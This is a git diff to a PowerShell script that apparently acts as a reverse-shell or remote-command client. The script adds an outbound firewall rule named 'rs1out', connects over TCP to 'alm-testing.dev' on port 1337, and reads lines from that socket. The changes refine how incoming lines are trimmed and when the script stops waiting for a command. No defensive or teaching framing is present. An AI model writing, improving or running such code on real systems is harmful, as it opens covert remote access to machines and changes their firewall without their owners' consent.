@@ -6,6 +6,7 @@ if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
 } 
 $cmd_wait = $true;
+$read_start = $false
 
 try {
 	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
@@ -28,11 +29,17 @@ try {
 			} else {
 				$in_stream = $client.GetStream();
 				$in_reader = New-Object System.IO.StreamReader($in_stream);
-				while ($in_reader.Peek() -ge 0) {		
+				while ($in_reader.Peek() -ge 0) {	
+					$read_start = $true;	
 					$in_buff = $in_reader.ReadLine();
-					Write-Output $in_buff;
+					$join = $in_buff -join "";
+					$trimmed = $join -replace '\r?\n\z';
+					Write-Output $trimmed;
 				}
-				$cmd_wait = $false;
+				if ($read_start -eq $true) {
+					$cmd_wait = $false;
+					$read_start = $false;
+				}
 			}				
 		} 
 		
